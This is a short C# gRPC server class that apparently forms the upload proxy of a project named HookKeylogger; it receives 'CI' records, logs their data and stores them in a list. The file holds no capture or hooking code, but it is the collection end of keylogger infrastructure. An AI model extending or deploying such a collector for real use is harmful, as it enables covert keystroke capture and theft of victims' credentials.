using System.Threading.Tasks;
using Grpc.Core;
using rpc = HookKeylogger.UploadProxy.Rpc;
using System.Collections.Generic;
using System;

namespace HookKeylogger.UploadProxy.Rpc
{
    /// <summary>
    /// Implementation of the ServerProxy rpc listener library
    /// </summary>
    public class UploadProxyImpl : rpc.UploadProxy.IUploadProxy
    {

        List<AggergationServer.Types.CI> cis; 
        public UploadProxyImpl()
        {
            this.cis = new List<AggergationServer.Types.CI>();
        }

        public Task<rpc.SendResponse> SendCi(rpc.SendRequest request, ServerCallContext context)
        {
            Console.WriteLine("Received Send Request" + request.Ci.Data);
            this.cis.Add(request.Ci);
            var resp = new SendResponse();
            resp.Status = SendResponse.Types.Status.OK;
            return Task.FromResult(resp);
        }
    }
}
